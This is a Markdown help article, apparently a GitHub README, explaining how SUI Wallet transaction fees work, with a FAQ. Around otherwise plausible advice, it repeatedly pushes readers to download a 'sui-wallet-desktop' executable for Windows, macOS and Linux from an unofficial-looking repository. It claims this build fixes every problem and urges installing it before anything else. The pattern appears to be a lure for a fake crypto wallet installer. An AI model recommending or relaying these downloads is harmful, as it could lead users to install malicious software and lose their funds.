![SUI Wallet](assets/banner-article.png)

# SUI Wallet transaction fees explained

Gas is paid in SUI, computed per transaction, and shown before you sign.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A transaction costs a small fee paid in SUI, and the wallet shows the estimate before you sign. The amount
moves with what the transaction does and with conditions on the network at that moment, so two identical
transfers on different days can cost different amounts. The fee is never paid in another token.

## What the fee is made of

The fee pays the network for processing the transaction, and it is denominated in SUI because that is the
asset the network charges in. The wallet states the fee asset wherever a fee is shown, so there is no
guessing which balance it comes out of.

For a reader deciding whether to send something, the useful summary is short: the fee is small, it is in
SUI, it is shown before the transaction is signed, and it is part of the amount that leaves the account.

## Why two transactions cost different amounts

Two things move the number. The first is what the transaction does: a simple transfer touches less than a
contract call that reads and writes several objects. The second is the state of the network when the
transaction is submitted, which is not something a reader can predict from a page.

That is why no honest page quotes a fee figure. This one does not, and it is worth treating any page that
does as out of date by the time you read it.

## Where the estimate appears

The estimate appears before the signature, in the same window that previews the transaction's effect: what leaves the account, how much, and where it goes. Read the fee there rather than working it out afterwards from a balance that has already changed.

If you decline, nothing is spent. The fee belongs to the signed transaction, not to opening the form.
[How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) walks that window field by field.

## The fee asset: SUI only

The fee is paid in SUI. A wallet holding other Sui-standard tokens and no SUI cannot pay for a transfer, which is the cause of the most common insufficient-balance message in any wallet, and the one people misread as a bug.

So keep a working balance in SUI. It does not need to be large; it needs to be there when you send, stake
or connect to something that asks for a signature.

## No valid gas coins found

That message means the account has nothing spendable to cover the fee, usually because the balance is fully
staked or because the SUI arrived on the wrong network. Check the spendable balance first; if the whole
position is staked, there is nothing available to pay with until something is unstaked.

That distinction - fully staked versus empty - is the one worth making before assuming the wallet is
broken. It is a balance question, not a software fault. If the balance looks sufficient and the message
persists, check which account is selected: a wallet with several accounts shows one balance at a time.

## Fees and failed transactions

A transaction that fails is a different outcome from one that is still pending, and the two need different
responses: one is finished, the other is still in play. Both deserve a look at the diagnostics panel
before anything is resubmitted.

Resubmitting while the first is still pending is how an intended single payment becomes two. The panel's
last transaction digest is what tells you whether the first one already happened.

A fee screen that behaves oddly - an estimate that never appears, or a state that does not resolve - is the
behaviour of an older build. Install the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest): the reported
problems are fixed there, and reading the estimate again on the current build is faster than diagnosing a
screen that no longer exists.

[Why is my Sui transaction pending?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/why-is-my-sui-transaction-pending.md) separates pending from failed, and the three causes that look
alike from outside.

## When a fee looks wrong

A fee that looks high for a transfer is usually a busy network rather than a mistake, and waiting costs
nothing. A fee that appears for something you did not initiate is a different matter - that is a signature
prompt, and declining is the right answer.

[Connecting SUI Wallet to a dApp](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/connecting-sui-wallet-to-a-dapp.md) covers what a connected site can ask for and what it cannot.

## FAQ

### Do I have any SUI for gas fees?

Look at the spendable balance, not the total. If it is fully staked, unstake something first; if it is
empty, the account needs SUI before it can send anything.

### What are Sui gas fees and who pays them?

The fee is charged by the network for processing a transaction, and it is paid by the account that signs
it - you, for your own sends. It is denominated in SUI and shown before you approve.

### Why was I charged for a transaction that did not go through?

A transaction that was submitted has been worked on by the network, which is what the fee pays for. The
diagnostics panel shows the last digest if you need to see what was submitted.

### Can I pay the fee in another token?

No. The fee asset is SUI, and the wallet states that wherever a fee appears.

### Does staking cost a fee?

Staking is a transaction, so it carries one, shown before you sign. The staking screen shows the estimate
in the same place as any other send.

### Why does the same transfer cost more today?

Network conditions differ from one submission to the next, and the estimate reflects the moment. Nothing
is wrong with the wallet when the number moves.
